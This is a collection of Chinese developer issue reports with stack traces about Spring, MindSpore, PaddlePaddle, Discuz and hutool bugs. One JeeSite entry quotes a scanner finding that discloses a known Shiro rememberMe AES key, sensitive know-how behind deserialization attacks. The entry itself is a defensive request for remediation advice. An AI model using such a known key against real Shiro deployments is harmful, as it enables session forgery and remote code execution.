~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) ~[tomcat-embed-websocket-9.0.14.jar:9.0.14] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) ~[spring-web-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) ~[spring-web-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:92) ~[spring-web-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) ~[spring-web-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:93) ~[spring-web-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) ~[spring-web-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) ~[spring-web-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) ~[spring-web-5.1.4.RELEASE.jar:5.1.4.RELEASE] at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:199) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:490) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:408) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:834) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1417) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) ~[na:1.8.0_131] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) ~[na:1.8.0_131] at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) ~[tomcat-embed-core-9.0.14.jar:9.0.14] at java.lang.Thread.run(Thread.java:748) ~[na:1.8.0_131] Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target at sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:387) ~[na:1.8.0_131] at sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:292) ~[na:1.8.0_131] at sun.security.validator.Validator.validate(Validator.java:260) ~[na:1.8.0_131] at sun.security.ssl.X509TrustManagerImpl.validate(X509TrustManagerImpl.java:324) ~[na:1.8.0_131] at sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:229) ~[na:1.8.0_131] at sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:124) ~[na:1.8.0_131] at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1496) ~[na:1.8.0_131] ... 100 common frames omitted Caused by: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target at sun.security.provider.certpath.SunCertPathBuilder.build(SunCertPathBuilder.java:141) ~[na:1.8.0_131] at sun.security.provider.certpath.SunCertPathBuilder.engineBuild(SunCertPathBuilder.java:126) ~[na:1.8.0_131] at java.security.cert.CertPathBuilder.build(CertPathBuilder.java:280) ~[na:1.8.0_131] at sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:382) ~[na:1.8.0_131] ... 106 common frames omitted 2020-06-26 09:25:21.490 DEBUG 17508 --- [nio-8080-exec-3] o.s.j.d.DataSourceTransactionManager : Initiating transaction rollback 2020-06-26 09:25:21.490 DEBUG 17508 --- [nio-8080-exec-3] o.s.j.d.DataSourceTransactionManager : Rolling back JDBC transaction on Connection [com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl@773b09c7] 2020-06-26 09:25:21.499 DEBUG 17508 --- [nio-8080-exec-3] o.s.j.d.DataSourceTransactionManager : Releasing JDBC Connection [com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl@773b09c7] after transaction 2020-06-26 09:25:21.499 INFO 17508 --- [nio-8080-exec-3] c.i.u.launcher.controller.ApiController : [用户请求] 用时 28494ms, response=""{\""errmsg\"":\""用户第三方登录失败\"",\""errno\"":11007,\""timestamp\"":1593134693005}"" 2020-06-26 09:25:21.500 DEBUG 17508 --- [nio-8080-exec-3] m.m.a.RequestResponseBodyMethodProcessor : Using 'text/plain', given [*/*] and supported [text/plain, */*, text/plain, */*, application/json, application/*+json, application/json, application/*+json] 2020-06-26 09:25:21.500 DEBUG 17508 --- [nio-8080-exec-3] m.m.a.RequestResponseBodyMethodProcessor : Writing [""{""errmsg"":""用户第三方登录失败"",""errno"":11007,""timestamp"":1593134693005}""]"
feign 调用报错 No thread-bound request found:,"pigx版本: master 操作系统: window10 是否修改包名: 否 No thread-bound request found: Are you referring to request attributes outside of an actual web request, or processing a request outside of the originally receiving thread? If you are actually operating within a web request and still receive this message, your code is probably running outside of DispatcherServlet: In this case, use RequestContextListener or RequestContextFilter to expose the current request.   <code>: Caused by: java.lang.IllegalStateException: No thread-bound request found: Are you referring to request attributes outside of an actual web request, or processing a request outside of the originally receiving thread? If you are actually operating within a web request and still receive this message, your code is probably running outside of DispatcherServlet: In this case, use RequestContextListener or RequestContextFilter to expose the current request. 想将用户多租户化，在pigx-common-data下新建了一个service--&gt;TenantDefaultServiceImpl然后调用UPMS-BIZ那边的api下的feign进行数据调用，发生报错"
Transpose算子在mindspore1.5运行异常于1.3,"之前发现Transpose算子（torch中对于permute）在mindspore1.3-Ascend910环境下计算效率很低，现根据建议切换至mindspore1.5-Ascend910 但是代码切换至1.5后，在modelarts多卡环境下使用semi并行模式下，Transpose算子报了之前没有过的异常，希望能帮忙看看，目前不能确定这个WARNING会不会影响算子的性能   <code>: [WARNING] KERNEL(97800,fffebf7fe1e0,python):2022-03-23-15:35:59.754.075 [mindspore/ccsrc/backend/kernel_compiler/tbe/tbe_kernel_select/tbe_kernel_select.cc:210] FilterInVaildKernelInfo] Tbe kernel info list is empty, all valid kernel info was filtered out. Check the input shape, attrs or other value of node : Default/network-RayceWithLoss/rayce-MultiRayce/rayce_branch1-RayceA/spread0-SwinSpread/spread-CellList/0-Spread/concat-Concat/TransposeNOD-op25942 [WARNING] KERNEL(97800,fffebf7fe1e0,python):2022-03-23-15:35:59.780.329 [mindspore/ccsrc/backend/kernel_compiler/tbe/tbe_kernel_select/tbe_kernel_select.cc:210] FilterInVaildKernelInfo] Tbe kernel info list is empty, all valid kernel info was filtered out. Check the input shape, attrs or other value of node : Default/network-RayceWithLoss/rayce-MultiRayce/rayce_branch1-RayceA/spread0-SwinSpread/spread-CellList/0-Spread/concat-Concat/TransposeNOD-op25943"
登录账户后，电脑睡眠一段时间后，过一段时间在刷新页面报Session is invalid，退出后重新登录又正常,pigx版本: 2.7.0 操作系统:Windows   <code>: org.springframework.web.util.NestedServletException: Request processing failed; nested exception is java.lang.IllegalStateException: UT000010: Session is invalid Cj0fbiQd7mzrJKz2sQ5ExazRQ9cMr6AkvWo5E3Uk at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1013) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:908) at javax.servlet.http.HttpServlet.service(HttpServlet.java:665) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:882) at javax.servlet.http.HttpServlet.service(HttpServlet.java:750) at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:320) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:127) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:91) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:119) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:137) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:111) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:170) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.oauth2.provider.authentication.OAuth2AuthenticationProcessingFilter.doFilter(OAuth2AuthenticationProcessingFilter.java:176) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:101) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:101)
Session or Program,"In this design doc, we define session as: The session object encapsulates the environment in which the computation graph is executed. But currently for local training this is what the do. The is represented as in protobuf format. It seems that we don't need to create another concept of same meaning, just add a or some attribute in can do the job.   <code>: Program IR ProgramDesc RemoteProgram ProgramDesc"
调整ColumnType的typeHandler的类型,建议将ColumnType字段typeHandler的类型修改为。 原因： 当项目里有很多字段需要映射为数据库的json类型，则需要定义一个TypeHandler： 如果typeHandler的类型为，在映射为json类型的字段上直接使用 就可。 而如果typeHandler的类型为就不能通过编译，此时只能针对每种类型定义一个TypeHandler，较繁琐。 参考资料： https://blog.csdn.net/cpongo3/article/details/96153147 https://gitee.com/baomidou/mybatis-plus/blob/master/mybatis-plus-annotation/src/main/java/com/baomidou/mybatisplus/annotation/TableField.java#LC140   <code>: Class&lt;? extends TypeHandler&lt;?&gt;&gt; Class&lt;? extends TypeHandler&gt; public class JsonTypeHandler&lt;T&gt; extends BaseTypeHandler&lt;T&gt; { private final Class&lt;T&gt; type; // 字段类型 public JsonTypeHandler(Class&lt;T&gt; type) { this.type = type; } // 省略json与类型T互转的代码 } Class&lt;? extends TypeHandler&gt; @ColumnType(typeHandler = JsonTypeHandler.class) Class&lt;? extends TypeHandler&lt;?&gt;&gt;
后台三级导航显示异常,后台三级导航显示异常。 疑似问题重现步骤 根据函数 shownav 的三个参数可推测 参数一为顶部导航 参数二为侧边导航 参数三为嵌入页面的顶部导航（有的页面没有）。但是进入后台发现，绝大多数有三级导航的页面上的导航树中仅显示二级导航。 如下界面： 全局 ? 注册与访问控制 全局 ? 站点功能 全局 ? 性能优化 全局 ? SEO设置 全局 ? 域名设置 全局 ? 广播设置（仅包含一个三级导航建议去掉三级导航栏） 全局 ? 空间设置 全局 ? 积分设置 全局 ? 上传设置 全局 ? 水印设置 全局 ? 手机版设置（仅包含一个三级导航建议去掉三级导航栏） 全局 ? 防采集设置 界面 ? 导航设置 界面 ? 界面设置 界面 ? 表情管理 界面 ? 表态动作 界面 ? 主题鉴定 界面 ? 编辑器设置 界面 ? 内容审核（该侧边导航内导航树结构错误，在一级导航后未显示二级导航与三级导航而是直接显示二级导航下拉菜单） 内容 ? 词语过滤 内容 ? 用户举报 内容 ? 标签管理 内容 ? 淘帖管理 内容 ? 论坛主题管理 内容 ? 群组主题管理 内容 ? 主题回收站 内容 ? 回帖回收站 内容 ? 版块/群组置顶 内容 ? 帖子点评管理 内容 ? 记录管理 内容 ? 日志管理 内容 ? 日志回收站 内容 ? 动态管理 内容 ? 相册管理 内容 ? 图片管理 内容 ? 留言管理 内容 ? 分享管理 用户 ? 用户管理 用户 ? 用户栏目（该侧边导航内导航树结构错误，在第一个三级导航中未显示三级导航，第二导航中未显示二级导航） 用户 ? 用户标签 用户 ? 禁止 IP 用户 ? 审核用户 用户 ? 用户组 用户 ? 推荐关注（导航结构错误，与下面所处同一三级导航） 用户 ? 推荐好友（导航结构错误，与上面所处同一三级导航） 用户 ? 资料审核 门户 ? 频道栏目 门户 ? 文章管理 门户 ? 专题管理 门户 ? HTML管理（感觉缺少该页面的三级导航） 门户 ? 页面管理 门户 ? 模块管理 门户 ? 模块模板 门户 ? 第三方模块 门户 ? 权限列表 门户 ? 日志分类 门户 ? 相册分类 门户 ? 相册分类 安全 ? 基本设置 安全 ? 验证设置 运营 ? 站点广告（在点击所有广告是行为与整体不符） 运营 ? 站点任务 运营 ? 道具中心 ? 道具赠送（三级导航名称与导航树不符） 运营 ? 勋章中心 ? 颁发勋章（三级导航名称与导航树不符） 运营 ? 电子商务（仅在基本设置界面有正确显示） 运营 ? 站长推荐 插件（是新独立出来的页面，导航树没有正确的显示二级导航结构） 模板（是新独立出来的页面，导航树没有正确的显示二级导航结构） 工具 ? 运行记录（该页面三级导航下存在四级导航，是否有必要增加 shownav 的参数以匹配与该情况类似的情况） 站长 ? 后台管理团队 站长 ? 邮件设置 站长 ? 主题分表 UCenter（导航未更新） 正确包含三级导航的页面： 运营 ? 站点公告 运营 ? 道具中心 运营 ? 勋章中心 运营 ? 电子商务（仅在基本设置界面有正确显示） 运营 ? 充值卡密 站长 ? 数据库 报错信息 无 为解决问题做过哪些尝试 无 版本信息 Discuz! 版本: Discuz! X3.4 Release 版本: Rv3.4-202103250500-abbba754 UTF-8 服务器系统版本: Microsoft-IIS/10.0 PHP 版本: WINNT / PHP v7.4.11 MySQL / MariaDB 版本: 8.0.22 内存缓存类型和版本: 无 其他信息 无   <code>: admin.php?action=makehtml
量化函数class WtsARQ(PrimitiveWithInfer)按照示例运行有误,": Ascend : -- MindSpore version : 1.5.1 -- Python 3.7.5 -- Linux Ubuntu 16.04 -- GCC/Compiler version : 7.3.0 https://gitee.com/mindspore/mindspore/blob/master/mindspore/python/mindspore/ops/operations/_quant_ops.py 按照示例运行了一下，发现程序会报错，加了几个参数之后输出的结果也和说明中的不一样 可以正常运行，并输出相应的参数   <code>: class WtsARQ(PrimitiveWithInfer): """""" The WtsARQ(Weights Adaptive Range Quantization). Args: num_bits (int): The bits num used for quantize. offset_flag (bool): Whether use offset for quantize. Inputs: - **w** (Tensor) - A Tensor of weights. With float16 or float32 data type. Outputs: - **scale** (Tensor) - A tensor of optimal scale, has the same type as `w`. - **offset** (Tensor) - A tensor of optimal offset, has the same type as `w`. - If axis is [], the shape of scale and offset is :math:`(1, )`. - If axis is [0], the shape of scale and offset is :math:`(w_1, )`. - If axis is [1], the shape of scale and offset is :math:`(w_2, )`. - **y** (Tensor) - A tensor of fakequant weights, has the same type and shape as `w`. Examples: &gt;&gt;&gt; data = Tensor(np.random.rand(1, 3, 6, 4).astype(np.float32)) &gt;&gt;&gt; wts_arq = Q.WtsARQ(axes=[0], num_bits=8, offset_flag=False) &gt;&gt;&gt; scale, offset, y = wts_arq(data) """""""
【众智】【计算-GPU开发】Uniform,"连续均匀分布采样 算子原语 接口目录：mindspore/python/mindspore/ops/operations/random_ops.py x from float 属性 默认0.0 to float 属性 默认1.0 y 对应底层算子 对应底层算子Uniform PyTorch1.8.1接口： torch.Tensor.uniform_ https://pytorch.org/docs/1.8.1/generated/torch.Tensor.uniform_.html 3. 异常处理 4. 算子反向 tools\autograd\derivatives.yaml   <code>: class Uniform(Primitive): REG_OP(Uniform) .INPUT(x, TensorType({DT_FLOAT16, DT_FLOAT, DT_DOUBLE})) .OUTPUT(y, TensorType({DT_FLOAT16, DT_FLOAT, DT_DOUBLE})) .ATTR(from, Float, 0.0) .ATTR(to, Float, 1.0) .OP_END_FACTORY_REG(Uniform) - name: uniform_(Tensor(a!) self, float from=0, float to=1, *, Generator? generator=None) -&gt; Tensor(a!) self: zeros_like(grad)"
ones接口有问题,"PaddlePaddle （develop） Python 3.5 Ubuntu 16.04 问题 接口应该是有bug的，1.3版本就没有。错误如下：   <code>: fluid.layers.ones ones = fluid.layers.ones(shape=[2, 2], dtype='float32') File ""/home/test/PaddlePaddle_Python3.5/lib/python3.5/site-packages/paddle/fluid/layers/tensor.py"", line 600, in ones assert reduce(lambda x, y: x * y, NameError: name 'reduce' is not defined"
拉取最新代码运行后端，启动网关、认证、系统模块，全都报错了,"本人操作步骤(win10环境，idea)： 1、拉取代码 2、创建数据库，执行必要sql脚本。 3、修改项目中jdbc配置，修改nacos的mysql配置 4、本地启动nacos 5、启动网关模块 <em>报错</em> ：Connection refused: no further information: localhost/127.0.0.1:6379。但是在网关模块中没有找到redis相关配置。 6、启动认证模块 失败 ：说是有循环依赖，这个是拉取的最新代码，理论上应该不会有这个问题，请问大家遇到过吗？ 7、启动system模块 失败 ：这个类和方法都是存在的，但是就是扫描不到，我已经尝试了清除idea缓存，clean,rebuild，等方式，依然存在这个错误 第二天 2022年3月30日14:40:11 尝试： 我本地的nacos连接到了mysql ry-config ,启动nacos。在nacos管理界面中查看网关的yml配置没有需要修改的mysql和redis配置。（参考：https://www.cnblogs.com/wang0327/p/15187469.html） 在运行网关模块的时候一直循环报错: 我本地启动了standalone模式的8848端口的nacos实例 cmd执行： 可以正确获取nacos里的配置，所以连接8848应该没有问题，不知道为什么会循环报出上面的错误   <code>: *************************** APPLICATION FAILED TO START *************************** Description: The dependencies of some of the beans in the application context form a cycle: tokenController (field private com.ruoyi.auth.service.SysLoginService com.ruoyi.auth.controller.TokenController.sysLoginService) ↓ sysLoginService (field private com.ruoyi.system.api.RemoteLogService com.ruoyi.auth.service.SysLoginService.remoteLogService) ↓ org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration$EnableWebMvcConfiguration ┌─────┐ | com.alibaba.cloud.sentinel.SentinelWebAutoConfiguration (field private java.util.Optional com.alibaba.cloud.sentinel.SentinelWebAutoConfiguration.sentinelWebInterceptorOptional) └─────┘ Caused by: org.apache.ibatis.binding.BindingException: Invalid bound statement (not found): com.ruoyi.system.mapper.SysConfigMapper.selectConfigList at org.apache.ibatis.binding.MapperMethod$SqlCommand.&lt;init&gt;(MapperMethod.java:235) at org.apache.ibatis.binding.MapperMethod.&lt;init&gt;(MapperMethod.java:53) at org.apache.ibatis.binding.MapperProxy.lambda$cachedInvoker$0(MapperProxy.java:108) at java.util.concurrent.ConcurrentHashMap.computeIfAbsent(ConcurrentHashMap.java:1660) at org.apache.ibatis.util.MapUtil.computeIfAbsent(MapUtil.java:35) at org.apache.ibatis.binding.MapperProxy.cachedInvoker(MapperProxy.java:95) at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:86) at com.sun.proxy.$Proxy129.selectConfigList(Unknown Source) at com.ruoyi.system.service.impl.SysConfigServiceImpl.loadingConfigCache(SysConfigServiceImpl.java:152) at com.ruoyi.system.service.impl.SysConfigServiceImpl.init(SysConfigServiceImpl.java:38) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) 14:32:18.255 [main] INFO c.a.n.c.r.client - [printIfInfoEnabled,60] - [47d5f44e-5ce8-448b-9938-5c3e19a248b4_config-0] Try to connect to server on start up, server: {serverIp = '127.0.0.1', server main port = 8848} 14:32:20.306 [main] ERROR c.a.n.c.r.c.g.GrpcClient - [printIfErrorEnabled,99] - Server check fail, please check server 127.0.0.1 ,port 9848 is available , error ={} java.util.concurrent.ExecutionException: com.alibaba.nacos.shaded.io.grpc.StatusRuntimeException: UNAVAILABLE: io exception curl -X GET ""http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=ruoyi-gateway-dev.yml&amp;group=DEFAULT_GROUP"""
启动日志问题,主要是两点： &gt;&gt; 1 &gt;&gt; 2 是没有正确读取到ehcache.xml文件么？ @红薯   <code>: 18:44:17.549 [main] |-DEBUG in net.sf.ehcache.config.ConfigurationFactory[150] - Configuring ehcache from InputStream 18:44:17.608 [main] |-DEBUG in net.sf.ehcache.config.DiskStoreConfiguration[141] - Disk Store Path: /var/folders/_n/v_hc1w593zd23xy9719kb6pw0000gn/T/ehcache/beats_orange 18:44:17.623 [main] |-DEBUG in net.sf.ehcache.util.PropertyUtil[88] - propertiesString is null. 18:44:17.639 [main] |-DEBUG in net.sf.ehcache.config.ConfigurationHelper[185] - No CacheManagerEventListenerFactory class specified. Skipping... 18:44:17.654 [main] |-DEBUG in net.sf.ehcache.Cache[955] - No BootstrapCacheLoaderFactory class specified. Skipping... 18:44:17.654 [main] |-DEBUG in net.sf.ehcache.Cache[929] - CacheWriter factory not configured. Skipping... 18:44:17.656 [main] |-DEBUG in net.sf.ehcache.config.ConfigurationHelper[96] - No CacheExceptionHandlerFactory class specified. Skipping... 18:44:17.660 [main] |-DEBUG in net.sf.ehcache.Cache[955] - No BootstrapCacheLoaderFactory class specified. Skipping... 18:44:17.660 [main] |-DEBUG in net.sf.ehcache.Cache[929] - CacheWriter factory not configured. Skipping... 18:44:17.661 [main] |-DEBUG in net.sf.ehcache.config.ConfigurationHelper[96] - No CacheExceptionHandlerFactory class specified. Skipping... 18:44:17.661 [main] |-DEBUG in net.sf.ehcache.Cache[955] - No BootstrapCacheLoaderFactory class specified. Skipping... 18:44:17.661 [main] |-DEBUG in net.sf.ehcache.Cache[929] - CacheWriter factory not configured. Skipping... 18:44:17.661 [main] |-DEBUG in net.sf.ehcache.config.ConfigurationHelper[96] - No CacheExceptionHandlerFactory class specified. Skipping... 18:44:17.675 [main] |-DEBUG in net.sf.ehcache.store.MemoryStore[153] - Initialized net.sf.ehcache.store.MemoryStore for config 18:44:17.699 [main] |-DEBUG in net.sf.ehcache.Cache[1165] - Initialised cache: config 18:44:17.699 [main] |-DEBUG in net.sf.ehcache.config.ConfigurationHelper[325] - CacheDecoratorFactory not configured. Skipping for 'config'. 18:44:17.699 [main] |-DEBUG in net.sf.ehcache.config.ConfigurationHelper[354] - CacheDecoratorFactory not configured for defaultCache. Skipping for 'config'. 18:44:17.700 [main] |-DEBUG in net.sf.ehcache.store.MemoryStore[153] - Initialized net.sf.ehcache.store.MemoryStore for SYSTEM-CONFIG No CacheManagerEventListenerFactory class specified. Skipping... CacheDecoratorFactory not configured. Skipping for 'config'.
star shiro可枚举漏洞,"上次您给我的解决方案 shiro.rememberMe.secretKey 这参数适应于 v4 所有版本，yml没有的话，加进去就行；你也可以关闭这个功能，在 ShiroConfig 里找到 securityManager，加一行代码 bean.setRememberMeManager(null); 1、首先我的jeesite版本是4.0.5的，yml文件里并没有shiro.rememberMe.secretKey这个配置， 只有sso.secretKey和loginSubmit.secretKey这两个配置 2、其次您给出的解决方案 在 ShiroConfig 里找到 securityManager，加一行代码 bean.setRememberMeManager(null); 所以我找到了shiroconfig这个类,发现bean.setRememberMeManager(null)这样设置会报错   <code>: 发现 key 的值为 r0e3c16IdVkouZgk1TKVMg== 发现 mode 的值为 cbc 发现 origin_count 的值为 1 发现 cookie_name 的值为 rememberMe 发现 current_count 的值为 0 解决方案也告知我了，如下 升级 shiro 到 1.2.5 及以上版本。 如果在配置里配置了密钥，那么请一定不要使用网上的密钥，通过自己 base64 一个 AES 的密钥，或者利用官方提供的方法生成密钥： org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey() /** * Copyright (c) 2013-Now http://jeesite.com All rights reserved. */ package com.jeesite.test; import org.apache.shiro.crypto.AesCipherService; /** * v4.1.8 开始将不为记住我功能，设置默认密钥，即启动系统时生成新密钥。 * 这样会造成一个问题，比如：重启服务后，记住登录的用户因为解密失败，而需要重新登录。 * 为了解决这个问题，您可以通过这个类获取一个新密钥，设置到 shiro.rememberMe.secretKey 中即可。 * 另外，如果你从配置文件里将 shiro.rememberMe.secretKey 设置为空，启动系统时也会自动设置一个新的密钥。 * @author ThinkGem * @version 2019年11月6日 */ public class RememberMeKeyGen { public static void main(String[] args) { byte[] cipherKey = new AesCipherService().generateNewKey().getEncoded(); String secretKey = org.apache.shiro.codec.Base64.encodeToString(cipherKey); System.out.println(""shiro.rememberMe.secretKey = "" + secretKey); } } ### 通过您的解决方案我去解决问题中发现 **麻烦问一下，这边还可以如何解决啊**"
触发异常中断，导致coredump,"触发异常中断，导致coredump / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 代码： 正常退出   <code>: import mindspore from mindspore import Tensor import numpy as np arg_1 = Tensor(np.random.randint(-524288, 1, [4, 4, 4])).astype(mindspore.int32) arg_2 = Tensor(np.random.randint(-1073741824, 134217728, [2, 1])).astype(mindspore.int32) arg_3 = Tensor(np.random.randint(-8, 2048, [2, 4, 4])).astype(mindspore.int32) arg_4 = True res = mindspore.ops.scatter_nd_add(arg_1,arg_2,arg_3,arg_4,)"
URLUtil转义问题,"JDK版本： openjdk_8_201 hutool版本： 5.7.22 URLUtil.encodePathSegment不能转换'+'，debug下去到里面有个，个人理解这个sub-delims是扩展出来需要转义的字符，执行到转义的时候，'+'进去，出来还是'+';   <code>: URLEncoder.PATH_SEGMENT addSubDelims rewrittenPath.append((char) c); String a = ""http://172.21.25.15:8700/common/file/view?recordId=0b12047d45cdc3f67d1266fc7a124a35&amp;fullfilename=0b12047d45cdc3f67d1266fc7a124a351644302221753客户信息模版.xlsx""; System.out.println(URLUtil.encodePathSegment(Base64.encode(a)));"
